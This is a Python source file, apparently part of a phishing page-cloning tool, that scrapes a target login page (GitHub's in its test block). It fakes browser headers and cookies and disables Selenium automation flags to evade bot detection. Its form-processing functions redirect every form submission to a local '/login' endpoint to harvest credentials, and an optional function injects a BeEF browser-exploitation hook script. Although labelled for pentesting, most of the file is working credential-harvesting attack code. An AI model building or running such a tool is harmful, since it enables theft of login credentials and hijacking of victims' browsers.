        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-cache, no-store']),
        'Pragma': 'no-cache',
        'DNT': random.choice(['1', '0']),
    }
    
    # Add origin and referer carefully
    try:
        headers['Origin'] = f'https://{domain}'
        headers['Referer'] = f'https://{domain}/'
    except Exception:
        pass
    
    # Advanced Chrome-specific headers
    if 'Chrome' in user_agent:
        try:
            version = re.search(r'Chrome/(\d+)', user_agent)
            if version:
                v = version.group(1)
                headers.update({
                    'sec-ch-ua': f'"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': random.choice(['"Windows"', '"macOS"', '"Linux"']),
                })
        except Exception:
            pass
    
    return headers

def add_bypass_cookies(session, domain, session_id):
    """Add advanced bypass cookies that mimic real user sessions"""
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    
    standard_cookies = [
        ('_ga', f'GA1.2.{random_id}.{timestamp}'),
        ('_gid', f'GA1.2.{random.randint(100000000, 999999999)}'),
        ('session_id', generate_random_string(32)),
        ('csrftoken', generate_random_string(64)),
    ]
    
    for name, value in standard_cookies:
        try:
            session.cookies.set(name, value, domain=f'.{domain}')
        except Exception:
            try:
                session.cookies.set(name, value, domain=domain)
            except Exception:
                pass

def generate_random_string(length):
    """Generate cryptographically random string"""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    try:
        return ''.join(random.choices(chars, k=length))
    except AttributeError:
        return ''.join(random.choice(chars) for _ in range(length))

def configure_session_retries(session):
    """Configure advanced retry strategy"""
    try:
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        try:
            retry_strategy = Retry(
                total=3,
                status_forcelist=[403, 429, 500, 502, 503, 504],
                allowed_methods=["HEAD", "GET", "POST"],
                backoff_factor=1
            )
        except TypeError:
            retry_strategy = Retry(
                total=3,
                status_forcelist=[403, 429, 500, 502, 503, 504],
                method_whitelist=["HEAD", "GET", "POST"],
                backoff_factor=1
            )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
    except Exception:
        pass

def get_page_content(url, clone_env):
    """Get content with perfect bypass techniques"""
    driver = None

    if SELENIUM_AVAILABLE:
        try:
            content, driver = get_selenium_content(url, clone_env)
            return content, driver
        except Exception as e:
            logger.warning(f"Selenium bypass failed: {e}")
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass

    try:
        content = get_session_content(url, clone_env)
        return content, None
    except Exception as e:
        logger.warning(f"Session bypass failed: {e}")

    return None, None

def get_selenium_content(url, clone_env):
    """Perfect Selenium with enhanced monitoring"""
    options = Options()
    stealth_args = [
        '--headless', '--no-sandbox', '--disable-dev-shm-usage',
        '--disable-gpu', '--disable-extensions', '--window-size=1920,1080',
        f'--user-agent={clone_env["user_agent"]}', '--enable-logging', '--log-level=0'
    ]

    for arg in stealth_args:
        options.add_argument(arg)

    try:
        options.set_preference('dom.webdriver.enabled', False)
        options.set_preference('useAutomationExtension', False)
    except Exception:
        pass

    driver = webdriver.Firefox(options=options)

    try:
        driver.set_page_load_timeout(60)
        driver.implicitly_wait(20)
        logger.info(f"🔍 Selenium navigation to {url}")
        driver.get(url)

        WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )

        time.sleep(random.uniform(2, 4))

        scroll_positions = [0.2, 0.5, 0.8, 1.0, 0.3]
        for pos in scroll_positions:
            driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {pos});")
            time.sleep(random.uniform(0.5, 1.0))

        html = driver.page_source
        logger.info(f"✅ Selenium content retrieved: {len(html)} chars")
        return html, driver

    except Exception as e:
        logger.error(f"Selenium error: {e}")
        raise

def get_session_content(url, clone_env):
    """Perfect session-based content retrieval"""
    sessions = clone_env['sessions']
    
    for i, session in enumerate(sessions):
        try:
            logger.debug(f"🔄 Trying session {i+1}/3")
            PERFECT_CONFIG.rate_limit()
            response = session.get(url, allow_redirects=True, timeout=30)
            response.raise_for_status()
            logger.info(f"✅ Session {i+1} succeeded")
            return decode_main_response(response)
        except Exception as e:
            logger.warning(f"⚠️ Session {i+1} failed: {e}")
            continue
    
    raise Exception("All sessions failed")

def decode_main_response(response):
    """Perfect response decoding for main HTML content"""
    content = response.content
    encoding = response.headers.get('content-encoding', '').lower()

    if 'br' in encoding:
        try:
            content = brotli.decompress(content)
        except Exception:
            pass
    elif 'gzip' in encoding:
        try:
            content = gzip.decompress(content)
        except Exception:
            pass

    try:
        return content.decode('utf-8')
    except UnicodeDecodeError:
        encodings = ['utf-8', 'latin1', 'iso-8859-1', 'cp1252']
        for encoding in encodings:
            try:
                return content.decode(encoding)
            except Exception:
                continue
        return content.decode('utf-8', errors='ignore')

def discover_dynamic_resources(driver, base_url):
    """Enhanced discovery of dynamically loaded resources"""
    dynamic_resources = set()
    
    try:
        driver.execute_cdp_cmd('Network.enable', {})
        driver.execute_cdp_cmd('Runtime.enable', {})
        
        time.sleep(3)
        
        scroll_positions = [0.25, 0.5, 0.75, 1.0]
        for pos in scroll_positions:
            driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {pos});")
            time.sleep(1)
        
        driver.execute_script("""
            if (window.React && window.React.lazy) {
                document.querySelectorAll('*').forEach(el => {
                    if (el.offsetParent !== null) {
                        el.scrollIntoView();
                    }
                });
            }
            
            if (window.IntersectionObserver) {
                document.querySelectorAll('img[data-src], script[data-src]').forEach(el => {
                    el.scrollIntoView();
                });
            }
            
            if (typeof __webpack_require__ !== 'undefined') {
                try {
                    __webpack_require__.ensure = __webpack_require__.ensure || function() {};
                } catch(e) {}
            }
        """)
        
        time.sleep(4)
        
        try:
            logs = driver.get_log('performance')
            for log in logs:
                try:
                    message = json.loads(log['message'])['message']
                    if message['method'] == 'Network.responseReceived':
                        response_url = message['params']['response']['url']
                        if (response_url.startswith(base_url) and 
                            any(ext in response_url.lower() for ext in ['.js', '.css', '.png', '.jpg', '.svg', '.woff', '.woff2'])):
                            dynamic_resources.add(response_url)
                except (json.JSONDecodeError, KeyError):
                    continue
        except Exception as e:
            logger.warning(f"⚠️ Performance log reading failed: {e}")
        
        new_elements = driver.execute_script("""
            let urls = [];
            document.querySelectorAll('script[src], link[href]').forEach(el => {
                let url = el.src || el.href;
                if (url && url.startsWith(arguments[0])) {
                    urls.push(url);
                }
            });
            return urls;
        """, base_url)
        
        dynamic_resources.update(new_elements)
        
    except Exception as e:
        logger.warning(f"⚠️ Dynamic resource discovery failed: {e}")
    
    return list(dynamic_resources)

def discover_all_resources(soup, base_url):
    """Enhanced resource discovery with modern web patterns"""
    resources = []

    css_selectors = [
        ('link[rel="stylesheet"]', 'href', 'css'),
        ('link[data-href]', 'data-href', 'css'),
        ('link[href*=".css"]', 'href', 'css'),
        ('style[src]', 'src', 'css'),
        ('link[rel="preload"][as="style"]', 'href', 'css'),
        ('link[rel="alternate stylesheet"]', 'href', 'css'),
    ]

    for selector, attr, res_type in css_selectors:
        try:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and validate_resource_url(url, base_url):
                    resources.append((url, element, attr, res_type))
        except Exception:
            continue

    js_selectors = [
        ('script[src]', 'src', 'js'),
        ('script[data-src]', 'data-src', 'js'),
        ('script[data-lazy-src]', 'data-lazy-src', 'js'),
        ('link[rel="preload"][as="script"]', 'href', 'js'),
        ('link[rel="modulepreload"]', 'href', 'js'),
    ]

    for selector, attr, res_type in js_selectors:
        try:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and validate_resource_url(url, base_url):
                    resources.append((url, element, attr, res_type))
        except Exception:
            continue

    image_selectors = [
        ('img[src]', 'src', 'image'),
        ('img[data-src]', 'data-src', 'image'),
        ('img[data-lazy-src]', 'data-lazy-src', 'image'),
        ('img[data-original]', 'data-original', 'image'),
        ('source[src]', 'src', 'image'),
        ('source[srcset]', 'srcset', 'image'),
        ('link[rel*="icon"]', 'href', 'image'),
        ('meta[property="og:image"]', 'content', 'image'),
        ('meta[name="twitter:image"]', 'content', 'image'),
    ]

    for selector, attr, res_type in image_selectors:
        try:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and validate_resource_url(url, base_url):
                    if attr == 'srcset':
                        for src_part in url.split(','):
                            src_url = src_part.strip().split()[0]
                            if src_url and validate_resource_url(src_url, base_url):
                                resources.append((src_url, element, attr, res_type))
                    else:
                        resources.append((url, element, attr, res_type))
        except Exception:
            continue

    font_selectors = [
        ('link[href*=".woff"]', 'href', 'font'),
        ('link[href*=".woff2"]', 'href', 'font'),
        ('link[href*=".ttf"]', 'href', 'font'),
        ('link[href*=".otf"]', 'href', 'font'),
        ('link[href*=".eot"]', 'href', 'font'),
        ('link[rel="preload"][as="font"]', 'href', 'font'),
    ]

    for selector, attr, res_type in font_selectors:
        try:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and validate_resource_url(url, base_url):
                    resources.append((url, element, attr, res_type))
        except Exception:
            continue

    inline_resources = discover_inline_resources(soup, base_url)
    resources.extend(inline_resources)

    seen = set()
    unique_resources = []
    for resource in resources:
        url = resource[0]
        if url not in seen:
            seen.add(url)
            unique_resources.append(resource)

    return unique_resources

def discover_inline_resources(soup, base_url):
    """Enhanced inline resource discovery"""
    resources = []

    try:
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', style_tag.string)
                for url in urls:
                    if validate_resource_url(url, base_url):
                        resources.append((url, style_tag, 'content', 'asset'))
    except Exception:
        pass

    try:
        for element in soup.find_all(style=True):
            style = element.get('style', '')
            urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', style)
            for url in urls:
                if validate_resource_url(url, base_url):
                    resources.append((url, element, 'style', 'asset'))
    except Exception:
        pass

    return resources

def validate_resource_url(url, base_url):
    """Enhanced resource URL validation"""
    if not url or url.startswith(('data:', 'blob:', 'javascript:')):
        return False
    
    skip_domains = [
        'fonts.googleapis.com', 'cdnjs.cloudflare.com', 'ajax.googleapis.com',
        'code.jquery.com', 'stackpath.bootstrapcdn.com', 'unpkg.com', 'jsdelivr.net'
    ]
    
    try:
        if url.startswith('//'):
            scheme = urllib.parse.urlparse(base_url).scheme
            url = f"{scheme}:{url}"
        elif not url.startswith(('http://', 'https://')):
            return True
        
        parsed = urllib.parse.urlparse(url)
        if any(domain in parsed.netloc for domain in skip_domains):
            return False
            
    except Exception:
        return False
    
    return True

def generate_safe_filename(url, content_type):
    """Enhanced filename generation with better collision handling"""
    try:
        parsed = urllib.parse.urlparse(url)
        original_name = os.path.basename(parsed.path)

        if original_name and '.' in original_name and len(original_name) < 100:
            safe_name = re.sub(r'[^\w\-_.]', '_', original_name)
            return safe_name

        extensions = {
            'text/css': '.css', 'application/javascript': '.js', 'text/javascript': '.js',
            'application/x-javascript': '.js', 'image/jpeg': '.jpg', 'image/png': '.png',
            'image/gif': '.gif', 'image/svg+xml': '.svg', 'image/webp': '.webp',
            'application/font-woff': '.woff', 'application/font-woff2': '.woff2',
            'font/woff': '.woff', 'font/woff2': '.woff2'
        }

        ext = extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
        url_hash = hashlib.md5(url.encode()).hexdigest()[:12]
        timestamp = int(time.time() * 1000) % 10000
        
        return f"resource_{url_hash}_{timestamp}{ext}"
    except Exception:
        return f"resource_{random.randint(1000, 9999)}.bin"

def get_resource_subdir(resource_type, filename):
    """Get perfect subdirectory"""
    type_dirs = {'css': 'css', 'js': 'js', 'image': 'images', 'font': 'fonts'}
    
    if resource_type in type_dirs:
        return type_dirs[resource_type]
        
    try:
        ext = os.path.splitext(filename)[1].lower()
        ext_dirs = {
            '.css': 'css', '.js': 'js',
            '.jpg': 'images', '.jpeg': 'images', '.png': 'images', 
            '.gif': 'images', '.svg': 'images', '.webp': 'images',
            '.woff': 'fonts', '.woff2': 'fonts', '.ttf': 'fonts'
        }
        
        return ext_dirs.get(ext, 'assets')
    except Exception:
        return 'assets'

def process_forms_for_pentesting(soup):
    """Perfect form processing for pentesting"""
    try:
        for form in soup.find_all('form'):
            original_action = form.get('action', '')
            if original_action:
                form['data-original-action'] = original_action
            form['action'] = '/login'
            form['method'] = 'post'
    except Exception as e:
        logger.warning(f"Form processing failed: {e}")

def add_form_override_javascript(soup):
    """Add perfect JavaScript form override"""
    try:
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('form').forEach(function(form) {
                    form.addEventListener('submit', function(e) {
                        e.preventDefault();
                        this.action = '/login';
                        this.method = 'post';
                        this.submit();
                    });
                });
            });
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)
    except Exception as e:
        logger.warning(f"Form override JavaScript failed: {e}")

def add_beef_hook(soup):
    """Add perfect BeEF hook"""
    try:
        script = soup.new_tag('script')
        script['src'] = 'http://localhost:3000/hook.js'
        script['type'] = 'text/javascript'
        
        body = soup.find('body')
        if body:
            body.append(script)
    except Exception as e:
        logger.warning(f"BeEF hook addition failed: {e}")

def process_regex_bypass(html_content, beef):
    """Regex processing fallback when BeautifulSoup is not available"""
    try:
        html_content = re.sub(
            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
            r'\1action="/login" data-original-action="\2"\3',
            html_content, flags=re.IGNORECASE
        )
        
        if beef == 'yes':
            beef_hook = '<script src="http://localhost:3000/hook.js"></script>'
            html_content = html_content.replace('</body>', beef_hook + '</body>')
    except Exception as e:
        logger.warning(f"Regex processing failed: {e}")
    
    return html_content

def save_complete_clone(html_content, clone_env):
    """Save perfect clone with comprehensive metadata"""
    try:
        os.makedirs(clone_env['output_dir'], exist_ok=True)
        
        with open(f'{clone_env["output_dir"]}/index.html', 'w', encoding='utf-8', errors='ignore') as f:
            f.write(html_content)

        metadata = {
            'timestamp': time.time(),
            'target_url': clone_env['url'],
            'resources_downloaded': len(PERFECT_CONFIG.downloaded_resources),
            'resources_failed': len(PERFECT_CONFIG.failed_resources),
            'success_rate': f"{PERFECT_CONFIG.success_rate:.1f}%",
            'avg_response_time': f"{PERFECT_CONFIG.avg_response_time:.2f}s",
            'clone_version': '5.0_final_perfect',
            'total_requests': PERFECT_CONFIG.request_count,
            'bypass_count': PERFECT_CONFIG.bypass_count
        }

        with open(f'{clone_env["output_dir"]}/metadata.json', 'w') as f:
            json.dump(metadata, f, indent=2)

        logger.info(f"📄 Metadata saved with {len(metadata)} metrics")
        return True

    except Exception as e:
        logger.error(f"Save failed: {e}")
        return False

# Main execution
if __name__ == "__main__":
    test_url = "https://github.com/login"
    test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    
    logger.info("🧪 Testing FINAL perfect cloning system...")
    result = clone(test_url, test_user_agent, "no")
    
    if result:
        logger.info("🎉 Test completed successfully!")
    else:
        logger.error("❌ Test failed!")
        
    logger.info(f"\n📊 Final Professional Stats:")
    logger.info(f"Resources cached: {len(PERFECT_CONFIG.downloaded_resources)}")
    logger.info(f"Failed resources: {len(PERFECT_CONFIG.failed_resources)}")
    logger.info(f"Success rate: {PERFECT_CONFIG.success_rate:.1f}%")
    logger.info(f"Average response time: {PERFECT_CONFIG.avg_response_time:.2f}s")
    logger.info(f"Total processing time: {time.time() - PERFECT_CONFIG.start_time:.2f}s")
